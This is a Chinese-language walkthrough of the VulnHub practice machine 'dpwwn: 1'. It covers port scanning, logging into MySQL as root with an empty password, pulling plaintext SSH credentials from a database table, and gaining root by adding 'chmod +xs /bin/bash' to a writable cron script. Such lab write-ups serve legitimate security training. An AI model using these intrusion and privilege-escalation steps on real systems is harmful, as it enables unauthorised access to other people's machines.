# dpwwn: 1

2024-6-12 https://www.vulnhub.com/entry/dpwwn-1,342/

difficulty: Easy

## IP

101.1.0.168

## Scan

Open Port -> 22,80,3306

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 c1d3be39429d5cb4952c5b2e20590e3a (RSA)
|   256 434ac610e7177da0c0c376881d43a18c (ECDSA)
|_  256 0ecce3e1f78773a10347b9e2cf1c9315 (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Apache HTTP Server Test Page powered by CentOS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
3306/tcp open  mysql   MySQL 5.5.60-MariaDB
| mysql-info:
|   Protocol: 10
|   Version: 5.5.60-MariaDB
|   Thread ID: 5
|   Capabilities flags: 63487
|   Some Capabilities: SupportsTransactions, ConnectWithDatabase, Support41Auth, IgnoreSigpipes, Speaks41ProtocolOld, SupportsLoadDataLocal, InteractiveClient, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, FoundRows, LongColumnFlag, ODBCClient, SupportsCompression, IgnoreSpaceBeforeParenthesis, LongPassword, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: $Z{~&>E#y^J8yxoFP<||
|_  Auth Plugin Name: mysql_native_password
```

优先看 80 web 服务，gobuster 扫描出一个 http://101.1.0.168/info.php 页面，没看到什么信息，其他页面也没有。

看看 mysql 吧，尝试看看空密码或者弱密码能不能登陆。

结果空密码就能进入， mysql -u root -h 101.1.0.168 -p 直接 2 个回车，不用输入密码。

发现 ssh 库中有 users 表：

```
MariaDB [ssh]> select * from users;
+----+----------+---------------------+
| id | username | password            |
+----+----------+---------------------+
|  1 | mistic   | testP@$$swordmistic |
+----+----------+---------------------+
1 row in set (0.006 sec)
```

尝试用此凭据进行 ssh 登陆，登陆成功。

进行系统枚举，寻找提权路径。

cat /etc/crontab 中发现以 root 身份每 3 分钟调用一次 /home/mistic/logrot.sh， 这个文件可以被修改，所以直接在文件中添加一行执行代码：

```
chmod +xs /bin/bash
```

等待 3 分钟，/bin/bash 就变成了 suid 权限：

```
[mistic@dpwwn-01 ~]$ /bin/bash -p
bash-4.2# id
uid=1000(mistic) gid=1000(mistic) euid=0(root) egid=0(root) 组=0(root),1000(mistic) 环境=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
bash-4.2# cd /root
bash-4.2# ls
anaconda-ks.cfg  dpwwn-01-FLAG.txt
bash-4.2# cat dpwwn-01-FLAG.txt

Congratulation! I knew you can pwn it as this very easy challenge.

Thank you.


64445777
6e643634
37303737
37373665
36347077
776e6450
4077246e
33373336
36359090
```
